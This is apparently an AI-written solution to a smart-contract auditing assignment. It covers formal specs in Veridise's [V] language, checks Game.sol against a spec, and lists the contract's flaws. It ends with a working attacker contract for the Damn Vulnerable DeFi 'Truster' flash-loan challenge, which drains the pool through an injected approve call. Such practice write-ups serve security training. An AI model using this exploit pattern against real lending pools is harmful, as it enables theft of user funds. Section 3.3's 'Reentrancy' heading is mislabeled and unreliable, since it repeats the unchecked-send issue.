# Auditor Assignment Solution

## Assumptions

Before proceeding with the tasks, I make the following assumptions:

1. **[V] Specification Language**: **[V] is Veridise’s declarative specification language** described in your prompt (statements of the form `action(target, property)`; blockchain variables like `sender`, `value`; utility like `old(...)`, `balance(acct)`, `fsum(...)`; and the `|=>` pre/post operator).

2. **RefundableCrowdsale**: I assume this refers to a typical OpenZeppelin-style RefundableCrowdsale contract where:
   - `goalReached()` returns `true` if the funding goal has been met
   - `isFinalized` is a boolean state variable (or equivalently a view function) indicating if the crowdsale has been finalized
   - `claimRefund()` allows participants to claim refunds when the goal is not reached
   - `withdraw()` allows participants to withdraw their contributed funds
   - `balanceOf(address)` returns the internal balance of a participant

---

## 1. Strategy: Formalizing Statements in [V] Specification Language

### 1.1 RefundableCrowdsale's claimRefund Transaction

**English Statement**: A RefundableCrowdsale's claimRefund transaction will revert if goalReached() or not isFinalized.

**Formalization in [V]** (using the standard `reverted(...)` statement):

```
reverted(RefundableCrowdsale.claimRefund,
  this.goalReached() || !this.isFinalized
)
```

**Notes / assumptions**:
- In [V], `this` refers to the contract instance receiving the transaction.
- If `isFinalized` is a function instead of a variable, write `!this.isFinalized()`.
- The statement above directly matches your English: “if (goalReached OR not finalized) then claimRefund reverts.”

### 1.2 RefundableCrowdsale's withdraw Transaction

**English Statement**: After a RefundableCrowdsale withdraw transaction, msg.sender's balance should increase by the original value (before the execution of the withdraw transaction) of balanceOf(msg.sender) and balanceOf(msg.sender) should be 0.

**Formalization in [V]**:

```
finished(RefundableCrowdsale.withdraw,
  true
 |=>
  this.balanceOf(sender) = 0
  && balance(sender) = old(balance(sender)) + old(this.balanceOf(sender))
)
```

**Notes / assumptions**:
- `sender` is the [V] blockchain variable for `msg.sender`.
- `balance(sender)` is the sender’s native-token (e.g., ETH) balance.
- This statement assumes `withdraw` pays out in native tokens and the payout amount equals the internal accounting `balanceOf(sender)` from just before the call.

---

## 2. Verification: Checking attempt Function Against Specification

### Given Specification

```
finished ( Game . attempt (_ ) ,
Game . started && value > Game . cost
|=> 
Game . value = fsum ( Game . attempt ( guess ) , true , guess )
)
```

### Analysis of Game.sol attempt Function

Looking at the `attempt` function in `Game.sol`:

```solidity
function attempt(uint guess) external payable {
    require(started);
    require(msg.value > cost);
    
    value = value.add(guess);
    bytes32 result = sha256(abi.encode(value));
    
    if(result == target) {
        payable(msg.sender).send(address(this).balance);
        started = false;
    }
}
```

### Comparison with Specification

**Under the [V] semantics you pasted, `attempt` *does* adhere to the given specification**, with one important caveat about a naming ambiguity.

1. **Precondition** (`Game.started && value > Game.cost`)
   - In [V], `value` is the **native tokens attached to the call** (i.e., Solidity `msg.value`).
   - In `Game.sol`, the precondition is enforced by:
     - `require(started);` and `require(msg.value > cost);`
   - So the precondition matches.

2. **Postcondition** (`Game.value = fsum(Game.attempt(guess), true, guess)`)
   - `fsum(Game.attempt(guess), true, guess)` is a [V] utility that (conceptually) sums the `guess` argument across **all successful `Game.attempt` transactions**.
   - In `Game.sol`, the state variable `value` is initialized to 0 and updated only by:
     - `value = value.add(guess);`
   - Therefore after any successful attempt, `value` equals the cumulative sum of all previous successful guesses, which matches the intent of the `fsum` expression.

**Caveat / ambiguity**:
- The contract has a storage variable named `value` (`uint value;`), and [V] also has a blockchain variable named `value` (the callvalue). In [V], **unqualified `value` means callvalue**, while storage should be referenced as `this.value` (or `Game.value` in your statement).
- Your statement uses `Game.value` on line 4, so it clearly intends the storage variable there, and uses bare `value` on line 2, so it clearly intends callvalue there. Under that reading, the spec matches the implementation.

---

## 3. Detection: Vulnerabilities in Game.sol

After analyzing the `Game.sol` contract, I've identified the following vulnerabilities:

### 3.1 **Missing Access Control on `setTarget` Function**

**Vulnerability**: The `setTarget` function has no access control - anyone can call it.

**Location**: Lines 126-129

```solidity
function setTarget(bytes32 t) external {
    target = t;
    started = true;
}
```

**Exploitation**:
- An attacker can call `setTarget` at any time, even while a game is in progress
- They can set the target to a hash they already know the preimage for
- After setting the target, they can immediately call `attempt` with the correct guess and win all funds
- This breaks the intended game mechanics where only the owner should be able to start new games

**Fix**: Add `require(msg.sender == owner)` check.

### 3.2 **Unsafe Ether Transfer Using `send`**

**Vulnerability**: The contract uses `send()` instead of `transfer()` or `call()`, and doesn't check the return value.

**Location**: Line 139

```solidity
payable(msg.sender).send(address(this).balance);
```

**Exploitation**:
- `send()` only forwards 2300 gas and returns `false` (rather than reverting) if it fails
- If the recipient is a contract with a receive/fallback function that requires more than 2300 gas, the send will fail silently
- The funds will be locked in the contract if the send fails
- After a failed send, `started` is still set to `false`, preventing further attempts

**Fix**: Use `transfer()` (which reverts on failure) or properly check the return value of `send()`.

### 3.3 **Reentrancy Vulnerability**

**Vulnerability**: **Silent payout failure can lock funds / break the “winner gets paid” behavior**.

**Location**: Lines 138-141

```solidity
if(result == target) {
    payable(msg.sender).send(address(this).balance);
    started = false;
}
```

**Exploitation**:
- `send(...)` **returns `false` on failure** and only forwards **2300 gas**.
- If `msg.sender` is a contract whose `receive`/`fallback` needs more than 2300 gas (or intentionally reverts), then the payout **fails** but the code:
  - does **not** check the return value, and
  - still sets `started = false`.
- Result: the game ends, but the “winner” did not receive funds, and the ETH remains in the contract until someone restarts the game with `setTarget` (which itself is unrestricted).

**Fix**:
- Use `call` and check success, reverting if payout fails; and/or
- Update state and record winnings before interaction (checks-effects-interactions), but still ensure payout failure is handled (e.g., withdraw pattern).

### 3.4 **Predictable Hash Computation**

**Vulnerability / deviation from intended behavior**: The on-chain “guess processing” is deterministic and public; combined with unrestricted `setTarget`, the game can be trivially rigged.

**Location**: Lines 135-136

```solidity
value = value.add(guess);
bytes32 result = sha256(abi.encode(value));
```

**Exploitation**:
- **Key issue is actually `setTarget`** (Section 3.1): an attacker can set
  - `target = sha256(abi.encode(currentValue + attackerGuess))`,
  then immediately call `attempt(attackerGuess)` and win, because the contract computes exactly `sha256(abi.encode(value + guess))`.
- Without that access-control bug, “front-running a winning guess” is generally infeasible because it would require finding a SHA-256 preimage for a target the attacker cannot choose.

**Fix**: Use a more unpredictable mechanism, or use a commit-reveal scheme.

### 3.5 **Integer Overflow Protection Redundancy**

**Vulnerability**: While SafeMath is used, Solidity 0.8.0+ has built-in overflow checks, making SafeMath redundant and potentially confusing.

**Location**: Throughout contract

**Note**: This is not a security vulnerability per se, but unnecessary code that could lead to confusion.

### 3.6 **No Validation on `guess` Parameter**

**Vulnerability**: The `guess` parameter has no bounds checking.

**Location**: Line 131

**Exploitation**:
- While not directly exploitable, extremely large values could cause issues
- More importantly, negative values are prevented by `uint`, but zero values are allowed which might not be intended

**Fix**: Add validation if needed: `require(guess > 0)` or appropriate bounds.

### 3.7 **Race Condition with `setTarget`**

**Vulnerability**: When `setTarget` is called, it immediately sets `started = true` without checking if there are pending funds.

**Location**: Lines 126-129

**Exploitation**:
- If a game is won but the send fails (locking funds), the owner could call `setTarget` to start a new game
- The locked funds from the previous game would become part of the new game's pot
- This could lead to funds being permanently locked if sends keep failing

### 3.8 **Missing Zero Address Check**

**Vulnerability**: No validation that `owner` is set to a non-zero address.

**Location**: Constructor (line 119)

**Exploitation**:
- If constructor is called incorrectly, `owner` could be zero, and no one could call `setTarget` properly (though this is less critical since `setTarget` currently has no access control)

---

## 4. Exploit: Damn Vulnerable DeFi Problem 3 (Truster)

### Challenge Overview

The Truster challenge involves a lending pool that offers flash loans of DVT (Damn Vulnerable Token) tokens. The pool holds 1 million DVT tokens, and the goal is to drain all funds from the pool in a single transaction.

### Vulnerability Analysis

The vulnerability lies in the `flashLoan` function's design. The function allows the borrower to make an arbitrary function call on any target address during the flash loan, without proper restrictions or validation.

**Key Vulnerable Code Pattern** (hypothetical TrusterLenderPool):

```solidity
function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data
) external returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));
    require(balanceBefore >= amount, "Not enough tokens in pool");

    token.transfer(borrower, amount);
    target.functionCall(data);  // Arbitrary call - VULNERABILITY!
    require(token.balanceOf(address(this)) >= balanceBefore, "Flash loan not repaid");
}
```

### Exploitation Strategy

**Step 1: Understanding the Attack Vector**

The `flashLoan` function allows calling any function on any contract. The critical insight is that we can:
1. Borrow tokens from the pool
2. During the loan, call `approve()` on the token contract, approving our attacker address to spend the pool's tokens
3. After the loan is repaid, use the approval to transfer tokens from the pool

**Step 2: Crafting the Exploit**

The attacker contract would work as follows:

```solidity
// Attacker contract
contract TrusterExploit {
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    
    constructor(address _token, address _pool) {
        token = IERC20(_token);
        pool = TrusterLenderPool(_pool);
    }
    
    function attack() external {
        // Step 1: Get the total balance of the pool
        uint256 poolBalance = token.balanceOf(address(pool));
        
        // Step 2: Prepare the data for the approve function call
        // We're calling token.approve(attackerAddress, poolBalance)
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        
        // Step 3: Flash loan with amount = 0 (we don't actually need to borrow)
        // The key is the arbitrary call that approves us to spend the pool's tokens
        pool.flashLoan(
            0,                          // amount (we use 0 since we only care about the approval)
            address(this),              // borrower
            address(token),             // target (the token contract)
            data                        // data (approve function call)
        );
        
        // Step 4: After the flash loan completes, transfer all tokens from pool to attacker
        token.transferFrom(address(pool), msg.sender, poolBalance);
    }
}
```

**Step 3: Execution Flow**

1. **Attacker calls `attack()`** on the exploit contract
2. **Exploit contract calls `pool.flashLoan(0, ...)`**:
   - `amount = 0`: We don't need to actually borrow tokens
   - `borrower = address(this)`: The exploit contract
   - `target = address(token)`: The DVT token contract
   - `data = approve(exploitContract, poolBalance)`: Approval data
3. **Inside `flashLoan`**:
   - Pool checks balance (passes since amount is 0 or balance exists)
   - Pool transfers 0 tokens (or actual amount if borrowing)
   - Pool executes `token.approve(address(exploitContract), poolBalance)`
     - **This is the critical step**: The pool approves the exploit contract to spend all its tokens!
   - Pool checks balance returned (passes since we borrowed 0 or returned what we borrowed)
4. **After `flashLoan` returns**:
   - Exploit contract calls `token.transferFrom(address(pool), msg.sender, poolBalance)`
   - This transfers all pool tokens to the attacker because the approval was granted during the flash loan

### Why This Works

The fundamental issue is that `flashLoan` allows making arbitrary calls using the pool's context (or with the pool as the caller), which means:
- The approval is granted **by the pool itself**
- The pool trusts that borrowers will only make benign calls
- There's no restriction on what functions can be called
- There's no validation that the call doesn't compromise the pool's security

### Prevention

To prevent this vulnerability:

1. **Restrict target addresses**: Only allow calls to whitelisted contracts
2. **Restrict function signatures**: Only allow specific function signatures that are safe
3. **Validate call effects**: Check that the call doesn't modify critical state (like approvals)
4. **Use a separate execution context**: Execute the callback in a way that doesn't allow modifying the pool's token approvals
5. **Implement proper access control**: Ensure flash loan callbacks can't perform privileged operations

---

## Summary

This assignment covered:
1. **Formal specification** of smart contract behaviors using [V] specification language
2. **Verification** of implementation against formal specifications
3. **Vulnerability detection** in smart contracts through security analysis
4. **Exploit description** of a known DeFi vulnerability

All analyses were conducted with clear assumptions and detailed explanations to ensure clarity and educational value.

